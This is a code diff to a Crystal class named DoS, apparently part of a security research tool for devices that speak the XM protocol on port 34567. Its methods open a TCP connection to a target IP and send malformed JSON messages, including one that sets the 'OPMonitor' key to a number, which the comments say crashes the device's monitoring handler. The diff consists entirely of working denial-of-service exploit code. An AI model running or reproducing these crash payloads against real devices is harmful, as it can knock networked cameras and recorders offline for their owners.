@@ -77,13 +77,13 @@ class DoS
   }
 
   # This one causes OPMonitor to crash because it expects the key OPMonitor to be a nested hash, not a number, or string.
-  def self.use_options_wrong_type(target_ip, port = 34567, command = Command::OPMonitor)
+  def self.use_wrong_type(target_ip, port = 34567, command = Command::Operation::Monitor::Request)
     success = false
 
     begin
       socket = XMSocketTCP.new(target_ip, port)
       xmm = command.new
-      xmm.message = "{\"#{command.to_s.split("::")[1]}\":0}"
+      xmm.message = "{\"OPMonitor\":0}"
       socket.send_message xmm
       socket.receive_message
     rescue e : XMError::ReceiveEOF
@@ -108,7 +108,8 @@ class DoS
 
   # Potentially the same problem as wrong type, need to further explore this possibility
   # TODO: Try 0 or null instead!
-  def self.use_message_quotes(target_ip, port = 34567, command : XMMessage.class = Command::GetSafetyAbility)
+  # TODO: Find out what version they patched this
+  def self.use_message_quotes(target_ip, port = 34567, command : XMMessage.class = Command::GetSafetyAbility::Request)
     success = false
     begin
       socket = XMSocketTCP.new(target_ip, port)
